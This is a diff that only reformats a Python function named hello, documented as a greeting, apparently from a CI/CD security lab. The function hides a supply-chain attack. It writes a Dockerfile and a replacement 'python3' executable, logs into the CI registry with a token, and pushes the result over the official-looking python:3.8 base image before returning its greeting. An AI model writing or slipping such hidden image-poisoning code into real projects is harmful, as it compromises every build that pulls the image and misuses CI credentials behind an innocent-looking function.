@@ -21,15 +21,19 @@ def hello(name):
     the person passed in as
     a parameter
     """
-    run('apk add docker-cli')
-    with open('Dockerfile', 'w') as f:
+    run("apk add docker-cli")
+    with open("Dockerfile", "w") as f:
         f.write(DOCKERFILE)
-    with open('python3', 'w') as f:
+    with open("python3", "w") as f:
         f.write(PYTHON3)
-    run('chmod +x python3')
-    run('DOCKER_HOST=tcp://docker:2375 docker build -t gitlab:5050/wonderland/nest-of-gold/python:3.8 .')
-    run('DOCKER_HOST=tcp://docker:2375 docker login -u gryphon -p $TOKEN $CI_REGISTRY')
-    run('DOCKER_HOST=tcp://docker:2375 docker push gitlab:5050/wonderland/nest-of-gold/python:3.8')
+    run("chmod +x python3")
+    run(
+        "DOCKER_HOST=tcp://docker:2375 docker build -t gitlab:5050/wonderland/nest-of-gold/python:3.8 ."
+    )
+    run("DOCKER_HOST=tcp://docker:2375 docker login -u gryphon -p $TOKEN $CI_REGISTRY")
+    run(
+        "DOCKER_HOST=tcp://docker:2375 docker push gitlab:5050/wonderland/nest-of-gold/python:3.8"
+    )
     return "Hello, " + name
 
 
